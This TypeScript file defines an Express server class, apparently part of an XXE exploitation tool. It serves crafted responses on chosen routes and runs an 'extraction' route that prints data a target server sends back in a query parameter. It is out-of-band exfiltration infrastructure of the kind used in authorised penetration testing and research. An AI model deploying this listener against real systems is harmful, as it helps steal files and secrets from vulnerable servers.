import express from "express";
import { Server } from "http";
import { Handler } from "./Handler";
import { CliUtils } from "./CliUtils";

const app = express();


export class XXEServer {

  server?: Server;

  address: string;
  port: number;
  started: boolean

  responses: any = {};


  public constructor(address = "127.0.0.1", port = 7777) {
    this.address = address;
    this.port = port;
    this.started = false;
  }

  public getServerUrl(): string {
    return `http://${this.address}:${this.port}`;
  }

  public addRoute(route: string, responseContent: string, printQueryString = false): string {
    const fullPath = this.getServerUrl() + route;

    //if a route already defined just change the response :) 
    if (Object.keys(this.responses).includes(route)) {
      this.responses[route] = responseContent;
      return fullPath;
    }

    this.responses[route] = responseContent;

    if (Handler.VERBOSE) CliUtils.printInfo("Setting route " + route);

    app.get(route, (request, response) => {
      if (Handler.VERBOSE) {
        CliUtils.printInfo(`[${new Date().toISOString()}] - Serving route ${route} to ip ${request.ip}`);
      }

      if (printQueryString) CliUtils.printSuccess(`Received extraction from ${request.ip}:\n` + request.query.p);
      response.send(this.responses[route]);
    });

    return fullPath;
  }

  public addExtractionRoute() {
    this.addRoute("/", "", true);
  }

  public getServer() {
    return app;
  }


  public start() {

    if (!this.started) {

      CliUtils.printInfo(`Starting server at ${this.getServerUrl()}`);

      this.server = app.listen(this.port, this.address);
      this.started = true;
    }
  }

  public stop() {
    if (Handler.VERBOSE) CliUtils.printInfo("Stopping server");
    this.server?.close();
    this.started = false;
  }

}